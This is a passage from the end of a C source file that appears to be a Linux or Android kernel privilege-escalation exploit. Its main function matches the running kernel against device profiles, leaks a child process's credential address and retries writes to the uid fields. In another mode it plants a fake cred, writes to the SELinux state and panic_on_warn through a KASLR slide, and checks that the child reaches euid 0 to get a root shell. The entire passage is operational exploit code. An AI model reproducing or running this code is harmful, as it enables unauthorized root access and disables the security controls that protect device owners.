        for (i = 0; i < NPROFILES; i++)
            logf("      %-12s %s\n",
                 g_profiles[i]->name, g_profiles[i]->kernel_match);
        _exit(1);
    }

    ps = sysconf(_SC_PAGESIZE);
    if (ps != (long)PAGE)
    {
        logf("[-] page size mismatch: got %ld, profile %s expects %lu\n",
             ps, g_tgt->name, PAGE);
        _exit(1);
    }

    logf("[+] pagesize=%ld profile=%s timer_site=%#llx copy_process=%#llx\n",
         ps, g_tgt->name,
         (unsigned long long)STATIC_TIMER_SITE,
         (unsigned long long)COPY_PROCESS_LOW21);
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    log_open();
    logf("=== start pid=%d argc=%d argv0=\"%s\" argv1=\"%s\" ===\n",
         getpid(), argc,
         argc > 0 && argv[0] ? argv[0] : "(null)",
         argc > 1 && argv[1] ? argv[1] : "(none)");
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify");

    detect_target();
    if (argc > 1 && !strcmp(argv[1], "target"))
    {
        printf("target=%s\ndevice=%s\nkernel=%s\npagesize=%lu\n"
               "profile=%s\ntimer_site=%#llx\n",
               g_tgt->name, g_device, g_kernel, (unsigned long)PAGE,
               g_tgt->name, (unsigned long long)STATIC_TIMER_SITE);
        return 0;
    }

    if (argc > 1 && !strcmp(argv[1], "shell"))
        shell_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;
    if (argc > 1 && !strcmp(argv[1], "ids"))
        ids_only = 1;
    if (argc > 1 && !strcmp(argv[1], "probe"))
        g_probe = 1;
    if (argc > 1 && !strcmp(argv[1], "fake"))
        g_fake_stage = 1;

    raw = malloc(48u << 20);
    if (!raw)
        return 1;
    if (argc > 2 && !strcmp(argv[1], "cpu"))
        g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
    {
        struct timespec ts = {.tv_sec = 10, .tv_nsec = 0};

        while (nanosleep(&ts, &ts) && errno == EINTR)
            ;
        _exit(42);
    }

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    logf("[+] pid=%d cpu=%d mode shell=%d fake=%d probe=%d leak=%d ids=%d\n",
         getpid(), g_cpu, shell_mode, g_fake_stage, g_probe, leak_only,
         ids_only);
    if (wr(TR "/buffer_size_kb", "8192\n"))
        logf("[!] buffer_size_kb write failed\n");
    enable_events();
    kick_rss();
    usleep(50000);

    if (discover_page_types(raw) != 0)
        return 1;
    if (ids_only)
        return 0;
    if (g_probe)
    {
        run_probe(raw);
        return 0;
    }

    g_base = calibrate_base(raw);
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    if (g_fake_stage)
        write_ksu_script();
    ensure_pool();
    ensure_raw();

    if (!g_fake_stage)
    {
        struct plant_res r;
        memset(&r, 0, sizeof(r));
        for (int a = 0; a < 3 && !r.ok; a++)
        {
            logf("[+] plant attempt %d/3\n", a + 1);
            run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
        }
        if (!r.ok)
            park_forever("no successful plant");
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");
        memset(&fc, 0, sizeof(fc));
        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                        raw, &fc))
            park_forever("fake cred write failed");
        if (!g_slide)
            park_forever("no KASLR slide");
        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
                        "selinux", raw, NULL))
            park_forever("selinux write failed");
        if (read_panic_on_warn() != 0 &&
            stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                        "panic_on_warn", raw, NULL))
            park_forever("panic_on_warn write failed");
    }
    logf("[+] cred writes landed, waking child\n");

    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    if (g_fake_stage)
        park_forever("fake cred page held; reboot to clean");
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}